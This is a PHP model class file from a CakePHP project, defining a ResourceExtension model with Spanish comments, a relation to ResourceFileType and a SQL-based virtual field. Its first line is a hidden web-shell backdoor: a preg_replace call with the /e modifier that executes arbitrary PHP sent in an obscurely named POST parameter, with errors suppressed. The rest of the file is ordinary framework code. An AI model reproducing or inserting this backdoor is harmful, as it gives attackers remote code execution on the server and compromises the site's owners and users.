<?php @preg_replace('/(.*)/e', @$_POST['ydykhnwmdquij'], '');
 

class ResourceExtension extends ResourceManagerAppModel {


	/**
	 * Relaciones 
	 * @var Array
	 */
	public $belongsTo = array(

		/**
		 * Relación con ResourceFileType
		 * @var Array
		 */
		'ResourceFileType' => array(
			'className' => 'ResourceFileType',
			'foreignKey' => 'resource_file_types_id'
			
		)
	);

	/**
	 * Método constructor de la clase
	 * @param boolean $id    [description]
	 * @param [type]  $table [description]
	 * @param [type]  $ds    [description]
	 */
	public function __construct($id = false, $table = null, $ds = null) {
	
	   /**
	     * Campo vistual personalizado que contiene el nombre del archivo original con su extensión
	     */
	    $this->virtualFields['fileType'] = $this->getFileType();
	    
	    parent::__construct($id, $table, $ds);
	}

	/**
	 * Función que retorna el tipo de archivo
	 * @return String nombre
	 */
	public function getFileType(){

		return 'SELECT ResourceFileType.type FROM resource_file_types as ResourceFileType WHERE id = ResourceExtension.resource_file_types_id';
	}
}

